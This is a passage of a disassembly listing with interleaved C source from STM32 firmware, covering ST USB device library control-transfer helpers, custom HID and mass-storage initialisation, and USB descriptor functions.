 800c21e:	2b00      	cmp	r3, #0
 800c220:	d1e7      	bne.n	800c1f2 <USBD_GetString+0x52>
 800c222:	e000      	b.n	800c226 <USBD_GetString+0x86>
    return;
 800c224:	bf00      	nop
  }
}
 800c226:	3718      	adds	r7, #24
 800c228:	46bd      	mov	sp, r7
 800c22a:	bd80      	pop	{r7, pc}

0800c22c <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c22c:	b480      	push	{r7}
 800c22e:	b085      	sub	sp, #20
 800c230:	af00      	add	r7, sp, #0
 800c232:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c234:	2300      	movs	r3, #0
 800c236:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c238:	687b      	ldr	r3, [r7, #4]
 800c23a:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c23c:	e005      	b.n	800c24a <USBD_GetLen+0x1e>
  {
    len++;
 800c23e:	7bfb      	ldrb	r3, [r7, #15]
 800c240:	3301      	adds	r3, #1
 800c242:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c244:	68bb      	ldr	r3, [r7, #8]
 800c246:	3301      	adds	r3, #1
 800c248:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c24a:	68bb      	ldr	r3, [r7, #8]
 800c24c:	781b      	ldrb	r3, [r3, #0]
 800c24e:	2b00      	cmp	r3, #0
 800c250:	d1f5      	bne.n	800c23e <USBD_GetLen+0x12>
  }

  return len;
 800c252:	7bfb      	ldrb	r3, [r7, #15]
}
 800c254:	4618      	mov	r0, r3
 800c256:	3714      	adds	r7, #20
 800c258:	46bd      	mov	sp, r7
 800c25a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c25e:	4770      	bx	lr

0800c260 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c260:	b580      	push	{r7, lr}
 800c262:	b084      	sub	sp, #16
 800c264:	af00      	add	r7, sp, #0
 800c266:	60f8      	str	r0, [r7, #12]
 800c268:	60b9      	str	r1, [r7, #8]
 800c26a:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c26c:	68fb      	ldr	r3, [r7, #12]
 800c26e:	2202      	movs	r2, #2
 800c270:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c274:	68fb      	ldr	r3, [r7, #12]
 800c276:	687a      	ldr	r2, [r7, #4]
 800c278:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c27a:	68fb      	ldr	r3, [r7, #12]
 800c27c:	687a      	ldr	r2, [r7, #4]
 800c27e:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c280:	687b      	ldr	r3, [r7, #4]
 800c282:	68ba      	ldr	r2, [r7, #8]
 800c284:	2100      	movs	r1, #0
 800c286:	68f8      	ldr	r0, [r7, #12]
 800c288:	f000 fdbc 	bl	800ce04 <USBD_LL_Transmit>

  return USBD_OK;
 800c28c:	2300      	movs	r3, #0
}
 800c28e:	4618      	mov	r0, r3
 800c290:	3710      	adds	r7, #16
 800c292:	46bd      	mov	sp, r7
 800c294:	bd80      	pop	{r7, pc}

0800c296 <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c296:	b580      	push	{r7, lr}
 800c298:	b084      	sub	sp, #16
 800c29a:	af00      	add	r7, sp, #0
 800c29c:	60f8      	str	r0, [r7, #12]
 800c29e:	60b9      	str	r1, [r7, #8]
 800c2a0:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c2a2:	687b      	ldr	r3, [r7, #4]
 800c2a4:	68ba      	ldr	r2, [r7, #8]
 800c2a6:	2100      	movs	r1, #0
 800c2a8:	68f8      	ldr	r0, [r7, #12]
 800c2aa:	f000 fdab 	bl	800ce04 <USBD_LL_Transmit>

  return USBD_OK;
 800c2ae:	2300      	movs	r3, #0
}
 800c2b0:	4618      	mov	r0, r3
 800c2b2:	3710      	adds	r7, #16
 800c2b4:	46bd      	mov	sp, r7
 800c2b6:	bd80      	pop	{r7, pc}

0800c2b8 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c2b8:	b580      	push	{r7, lr}
 800c2ba:	b084      	sub	sp, #16
 800c2bc:	af00      	add	r7, sp, #0
 800c2be:	60f8      	str	r0, [r7, #12]
 800c2c0:	60b9      	str	r1, [r7, #8]
 800c2c2:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c2c4:	68fb      	ldr	r3, [r7, #12]
 800c2c6:	2203      	movs	r2, #3
 800c2c8:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c2cc:	68fb      	ldr	r3, [r7, #12]
 800c2ce:	687a      	ldr	r2, [r7, #4]
 800c2d0:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c2d4:	68fb      	ldr	r3, [r7, #12]
 800c2d6:	687a      	ldr	r2, [r7, #4]
 800c2d8:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2dc:	687b      	ldr	r3, [r7, #4]
 800c2de:	68ba      	ldr	r2, [r7, #8]
 800c2e0:	2100      	movs	r1, #0
 800c2e2:	68f8      	ldr	r0, [r7, #12]
 800c2e4:	f000 fdc6 	bl	800ce74 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2e8:	2300      	movs	r3, #0
}
 800c2ea:	4618      	mov	r0, r3
 800c2ec:	3710      	adds	r7, #16
 800c2ee:	46bd      	mov	sp, r7
 800c2f0:	bd80      	pop	{r7, pc}

0800c2f2 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c2f2:	b580      	push	{r7, lr}
 800c2f4:	b084      	sub	sp, #16
 800c2f6:	af00      	add	r7, sp, #0
 800c2f8:	60f8      	str	r0, [r7, #12]
 800c2fa:	60b9      	str	r1, [r7, #8]
 800c2fc:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2fe:	687b      	ldr	r3, [r7, #4]
 800c300:	68ba      	ldr	r2, [r7, #8]
 800c302:	2100      	movs	r1, #0
 800c304:	68f8      	ldr	r0, [r7, #12]
 800c306:	f000 fdb5 	bl	800ce74 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c30a:	2300      	movs	r3, #0
}
 800c30c:	4618      	mov	r0, r3
 800c30e:	3710      	adds	r7, #16
 800c310:	46bd      	mov	sp, r7
 800c312:	bd80      	pop	{r7, pc}

0800c314 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c314:	b580      	push	{r7, lr}
 800c316:	b082      	sub	sp, #8
 800c318:	af00      	add	r7, sp, #0
 800c31a:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c31c:	687b      	ldr	r3, [r7, #4]
 800c31e:	2204      	movs	r2, #4
 800c320:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c324:	2300      	movs	r3, #0
 800c326:	2200      	movs	r2, #0
 800c328:	2100      	movs	r1, #0
 800c32a:	6878      	ldr	r0, [r7, #4]
 800c32c:	f000 fd6a 	bl	800ce04 <USBD_LL_Transmit>

  return USBD_OK;
 800c330:	2300      	movs	r3, #0
}
 800c332:	4618      	mov	r0, r3
 800c334:	3708      	adds	r7, #8
 800c336:	46bd      	mov	sp, r7
 800c338:	bd80      	pop	{r7, pc}

0800c33a <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c33a:	b580      	push	{r7, lr}
 800c33c:	b082      	sub	sp, #8
 800c33e:	af00      	add	r7, sp, #0
 800c340:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c342:	687b      	ldr	r3, [r7, #4]
 800c344:	2205      	movs	r2, #5
 800c346:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c34a:	2300      	movs	r3, #0
 800c34c:	2200      	movs	r2, #0
 800c34e:	2100      	movs	r1, #0
 800c350:	6878      	ldr	r0, [r7, #4]
 800c352:	f000 fd8f 	bl	800ce74 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c356:	2300      	movs	r3, #0
}
 800c358:	4618      	mov	r0, r3
 800c35a:	3708      	adds	r7, #8
 800c35c:	46bd      	mov	sp, r7
 800c35e:	bd80      	pop	{r7, pc}

0800c360 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c360:	b580      	push	{r7, lr}
 800c362:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c364:	2200      	movs	r2, #0
 800c366:	4912      	ldr	r1, [pc, #72]	; (800c3b0 <MX_USB_DEVICE_Init+0x50>)
 800c368:	4812      	ldr	r0, [pc, #72]	; (800c3b4 <MX_USB_DEVICE_Init+0x54>)
 800c36a:	f7fe fd68 	bl	800ae3e <USBD_Init>
 800c36e:	4603      	mov	r3, r0
 800c370:	2b00      	cmp	r3, #0
 800c372:	d001      	beq.n	800c378 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c374:	f7f4 fc7e 	bl	8000c74 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c378:	490f      	ldr	r1, [pc, #60]	; (800c3b8 <MX_USB_DEVICE_Init+0x58>)
 800c37a:	480e      	ldr	r0, [pc, #56]	; (800c3b4 <MX_USB_DEVICE_Init+0x54>)
 800c37c:	f7fe fd8f 	bl	800ae9e <USBD_RegisterClass>
 800c380:	4603      	mov	r3, r0
 800c382:	2b00      	cmp	r3, #0
 800c384:	d001      	beq.n	800c38a <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c386:	f7f4 fc75 	bl	8000c74 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c38a:	490c      	ldr	r1, [pc, #48]	; (800c3bc <MX_USB_DEVICE_Init+0x5c>)
 800c38c:	4809      	ldr	r0, [pc, #36]	; (800c3b4 <MX_USB_DEVICE_Init+0x54>)
 800c38e:	f7fc fca5 	bl	8008cdc <USBD_CUSTOM_HID_RegisterInterface>
 800c392:	4603      	mov	r3, r0
 800c394:	2b00      	cmp	r3, #0
 800c396:	d001      	beq.n	800c39c <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c398:	f7f4 fc6c 	bl	8000c74 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c39c:	4805      	ldr	r0, [pc, #20]	; (800c3b4 <MX_USB_DEVICE_Init+0x54>)
 800c39e:	f7fe fdb4 	bl	800af0a <USBD_Start>
 800c3a2:	4603      	mov	r3, r0
 800c3a4:	2b00      	cmp	r3, #0
 800c3a6:	d001      	beq.n	800c3ac <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c3a8:	f7f4 fc64 	bl	8000c74 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c3ac:	bf00      	nop
 800c3ae:	bd80      	pop	{r7, pc}
 800c3b0:	200001ac 	.word	0x200001ac
 800c3b4:	200003c0 	.word	0x200003c0
 800c3b8:	2000002c 	.word	0x2000002c
 800c3bc:	2000019c 	.word	0x2000019c

0800c3c0 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c3c0:	b580      	push	{r7, lr}
 800c3c2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c3c4:	2200      	movs	r2, #0
 800c3c6:	4912      	ldr	r1, [pc, #72]	; (800c410 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c3c8:	4812      	ldr	r0, [pc, #72]	; (800c414 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3ca:	f7fe fd38 	bl	800ae3e <USBD_Init>
 800c3ce:	4603      	mov	r3, r0
 800c3d0:	2b00      	cmp	r3, #0
 800c3d2:	d001      	beq.n	800c3d8 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c3d4:	f7f4 fc4e 	bl	8000c74 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c3d8:	490f      	ldr	r1, [pc, #60]	; (800c418 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c3da:	480e      	ldr	r0, [pc, #56]	; (800c414 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3dc:	f7fe fd5f 	bl	800ae9e <USBD_RegisterClass>
 800c3e0:	4603      	mov	r3, r0
 800c3e2:	2b00      	cmp	r3, #0
 800c3e4:	d001      	beq.n	800c3ea <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c3e6:	f7f4 fc45 	bl	8000c74 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c3ea:	490c      	ldr	r1, [pc, #48]	; (800c41c <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c3ec:	4809      	ldr	r0, [pc, #36]	; (800c414 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3ee:	f7fc ff27 	bl	8009240 <USBD_MSC_RegisterStorage>
 800c3f2:	4603      	mov	r3, r0
 800c3f4:	2b00      	cmp	r3, #0
 800c3f6:	d001      	beq.n	800c3fc <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c3f8:	f7f4 fc3c 	bl	8000c74 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c3fc:	4805      	ldr	r0, [pc, #20]	; (800c414 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3fe:	f7fe fd84 	bl	800af0a <USBD_Start>
 800c402:	4603      	mov	r3, r0
 800c404:	2b00      	cmp	r3, #0
 800c406:	d001      	beq.n	800c40c <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c408:	f7f4 fc34 	bl	8000c74 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c40c:	bf00      	nop
 800c40e:	bd80      	pop	{r7, pc}
 800c410:	200001ac 	.word	0x200001ac
 800c414:	2000069c 	.word	0x2000069c
 800c418:	200000a8 	.word	0x200000a8
 800c41c:	20000220 	.word	0x20000220

0800c420 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c420:	b480      	push	{r7}
 800c422:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c424:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c426:	4618      	mov	r0, r3
 800c428:	46bd      	mov	sp, r7
 800c42a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c42e:	4770      	bx	lr

0800c430 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c430:	b480      	push	{r7}
 800c432:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c434:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c436:	4618      	mov	r0, r3
 800c438:	46bd      	mov	sp, r7
 800c43a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c43e:	4770      	bx	lr

0800c440 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c440:	b580      	push	{r7, lr}
 800c442:	b082      	sub	sp, #8
 800c444:	af00      	add	r7, sp, #0
 800c446:	4603      	mov	r3, r0
 800c448:	460a      	mov	r2, r1
 800c44a:	71fb      	strb	r3, [r7, #7]
 800c44c:	4613      	mov	r3, r2
 800c44e:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c450:	4803      	ldr	r0, [pc, #12]	; (800c460 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c452:	f7fc fbd1 	bl	8008bf8 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c456:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c458:	4618      	mov	r0, r3
 800c45a:	3708      	adds	r7, #8
 800c45c:	46bd      	mov	sp, r7
 800c45e:	bd80      	pop	{r7, pc}
 800c460:	200003c0 	.word	0x200003c0

0800c464 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c464:	b480      	push	{r7}
 800c466:	b083      	sub	sp, #12
 800c468:	af00      	add	r7, sp, #0
 800c46a:	4603      	mov	r3, r0
 800c46c:	6039      	str	r1, [r7, #0]
 800c46e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c470:	683b      	ldr	r3, [r7, #0]
 800c472:	2212      	movs	r2, #18
 800c474:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c476:	4b06      	ldr	r3, [pc, #24]	; (800c490 <USBD_FS_DeviceDescriptor+0x2c>)
 800c478:	681b      	ldr	r3, [r3, #0]
 800c47a:	2b01      	cmp	r3, #1
 800c47c:	d101      	bne.n	800c482 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c47e:	4b05      	ldr	r3, [pc, #20]	; (800c494 <USBD_FS_DeviceDescriptor+0x30>)
 800c480:	e000      	b.n	800c484 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c482:	4b05      	ldr	r3, [pc, #20]	; (800c498 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c484:	4618      	mov	r0, r3
 800c486:	370c      	adds	r7, #12
 800c488:	46bd      	mov	sp, r7
 800c48a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c48e:	4770      	bx	lr
 800c490:	20000978 	.word	0x20000978
 800c494:	200001cc 	.word	0x200001cc
 800c498:	200001e0 	.word	0x200001e0

0800c49c <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c49c:	b480      	push	{r7}
 800c49e:	b083      	sub	sp, #12
 800c4a0:	af00      	add	r7, sp, #0
 800c4a2:	4603      	mov	r3, r0
 800c4a4:	6039      	str	r1, [r7, #0]
 800c4a6:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c4a8:	683b      	ldr	r3, [r7, #0]
 800c4aa:	2204      	movs	r2, #4
 800c4ac:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c4ae:	4b03      	ldr	r3, [pc, #12]	; (800c4bc <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c4b0:	4618      	mov	r0, r3
 800c4b2:	370c      	adds	r7, #12
 800c4b4:	46bd      	mov	sp, r7
 800c4b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4ba:	4770      	bx	lr
 800c4bc:	20000200 	.word	0x20000200

0800c4c0 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4c0:	b580      	push	{r7, lr}
 800c4c2:	b082      	sub	sp, #8
 800c4c4:	af00      	add	r7, sp, #0
 800c4c6:	4603      	mov	r3, r0
 800c4c8:	6039      	str	r1, [r7, #0]
 800c4ca:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c4cc:	79fb      	ldrb	r3, [r7, #7]
 800c4ce:	2b00      	cmp	r3, #0
 800c4d0:	d105      	bne.n	800c4de <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4d2:	683a      	ldr	r2, [r7, #0]
 800c4d4:	4907      	ldr	r1, [pc, #28]	; (800c4f4 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4d6:	4808      	ldr	r0, [pc, #32]	; (800c4f8 <USBD_FS_ProductStrDescriptor+0x38>)
 800c4d8:	f7ff fe62 	bl	800c1a0 <USBD_GetString>
 800c4dc:	e004      	b.n	800c4e8 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4de:	683a      	ldr	r2, [r7, #0]
 800c4e0:	4904      	ldr	r1, [pc, #16]	; (800c4f4 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4e2:	4805      	ldr	r0, [pc, #20]	; (800c4f8 <USBD_FS_ProductStrDescriptor+0x38>)
 800c4e4:	f7ff fe5c 	bl	800c1a0 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c4e8:	4b02      	ldr	r3, [pc, #8]	; (800c4f4 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c4ea:	4618      	mov	r0, r3
 800c4ec:	3708      	adds	r7, #8
 800c4ee:	46bd      	mov	sp, r7
 800c4f0:	bd80      	pop	{r7, pc}
 800c4f2:	bf00      	nop
 800c4f4:	2000097c 	.word	0x2000097c
 800c4f8:	0800d1e8 	.word	0x0800d1e8

0800c4fc <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4fc:	b580      	push	{r7, lr}
 800c4fe:	b082      	sub	sp, #8
 800c500:	af00      	add	r7, sp, #0
 800c502:	4603      	mov	r3, r0
 800c504:	6039      	str	r1, [r7, #0]
 800c506:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c508:	683a      	ldr	r2, [r7, #0]
 800c50a:	4904      	ldr	r1, [pc, #16]	; (800c51c <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c50c:	4804      	ldr	r0, [pc, #16]	; (800c520 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c50e:	f7ff fe47 	bl	800c1a0 <USBD_GetString>
  return USBD_StrDesc;
 800c512:	4b02      	ldr	r3, [pc, #8]	; (800c51c <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c514:	4618      	mov	r0, r3
 800c516:	3708      	adds	r7, #8
 800c518:	46bd      	mov	sp, r7
 800c51a:	bd80      	pop	{r7, pc}
 800c51c:	2000097c 	.word	0x2000097c
 800c520:	0800d1fc 	.word	0x0800d1fc

0800c524 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c524:	b580      	push	{r7, lr}
 800c526:	b082      	sub	sp, #8
 800c528:	af00      	add	r7, sp, #0
 800c52a:	4603      	mov	r3, r0
 800c52c:	6039      	str	r1, [r7, #0]
 800c52e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c530:	683b      	ldr	r3, [r7, #0]
 800c532:	221a      	movs	r2, #26
 800c534:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c536:	f000 f855 	bl	800c5e4 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c53a:	4b02      	ldr	r3, [pc, #8]	; (800c544 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c53c:	4618      	mov	r0, r3
 800c53e:	3708      	adds	r7, #8
 800c540:	46bd      	mov	sp, r7
 800c542:	bd80      	pop	{r7, pc}
 800c544:	20000204 	.word	0x20000204

0800c548 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c548:	b580      	push	{r7, lr}
 800c54a:	b082      	sub	sp, #8
 800c54c:	af00      	add	r7, sp, #0
 800c54e:	4603      	mov	r3, r0
 800c550:	6039      	str	r1, [r7, #0]
 800c552:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c554:	79fb      	ldrb	r3, [r7, #7]
 800c556:	2b00      	cmp	r3, #0
 800c558:	d105      	bne.n	800c566 <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c55a:	683a      	ldr	r2, [r7, #0]
 800c55c:	4907      	ldr	r1, [pc, #28]	; (800c57c <USBD_FS_ConfigStrDescriptor+0x34>)
 800c55e:	4808      	ldr	r0, [pc, #32]	; (800c580 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c560:	f7ff fe1e 	bl	800c1a0 <USBD_GetString>
 800c564:	e004      	b.n	800c570 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c566:	683a      	ldr	r2, [r7, #0]
 800c568:	4904      	ldr	r1, [pc, #16]	; (800c57c <USBD_FS_ConfigStrDescriptor+0x34>)
 800c56a:	4805      	ldr	r0, [pc, #20]	; (800c580 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c56c:	f7ff fe18 	bl	800c1a0 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c570:	4b02      	ldr	r3, [pc, #8]	; (800c57c <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c572:	4618      	mov	r0, r3
 800c574:	3708      	adds	r7, #8
 800c576:	46bd      	mov	sp, r7
 800c578:	bd80      	pop	{r7, pc}
 800c57a:	bf00      	nop
 800c57c:	2000097c 	.word	0x2000097c
 800c580:	0800d200 	.word	0x0800d200

0800c584 <USBD_FS_InterfaceStrDescriptor>:
